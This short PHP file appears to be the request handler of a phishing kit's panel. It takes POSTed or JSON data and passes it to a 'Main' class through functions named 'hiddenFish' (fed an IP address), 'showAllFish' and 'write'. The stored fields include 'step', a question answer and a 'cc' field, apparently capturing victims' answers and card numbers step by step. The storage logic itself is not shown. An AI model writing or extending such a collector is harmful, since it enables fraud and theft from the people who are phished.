<?php
require_once('vendor/autoload.php');
function is_session_started()
{
    if (php_sapi_name() !== 'cli') {
        if (version_compare(phpversion(), '5.4.0', '>=')) {
            return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE;
        } else {
            return session_id() === '' ? FALSE : TRUE;
        }
    }
    return FALSE;
}

if (is_session_started() === FALSE) session_start();

use Src\App\Main;
use Src\Config\Header;
use Src\Config\Env;

$env = new Env();
Header::load();
//$env->__dd($_POST);
//$env->__dd($_SESSION['csrf']);

//$valorcaja1 = filter_input(INPUT_POST, "caracter1");
//$data = filter_input(INPUT_POST, 'token');

var_dump($_POST['step']);

$data = json_decode(file_get_contents("php://input"));

if (!isset($data)) {
    /*New hidden_fish*/
    $processed_ip = filter_input(INPUT_POST,"hidden_fish");
    if(!empty($processed_ip)) {
        $main = new Main();
        $main->hiddenFish(trim($processed_ip));
        //echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
    }
    /*End hidden_fish*/

    /*New Show All fish*/
    $show_all = filter_input(INPUT_POST,"show_all");
    if(!empty($show_all)) {
        $main = new Main();
        $main->showAllFish($show_all);
        //echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
    }
    /*End Show All fish*/

    if(!empty($_POST['step'])) {
        $data = [
            'step' => $_POST['step'],
            'input' => $_POST['inpt_question'],
            'input2' => $_POST['input'],
            'input3' => $_POST['cc'],
        ];

        $main = new Main();
        $encode_data = json_encode($data);
        $main->write(json_decode($encode_data));
        //echo "<meta http-equiv='refresh' content='0;URL=".$_SERVER['HTTP_REFERER']."'>";
    }
} else {
    $main = new Main();
    $main->write($data);
}
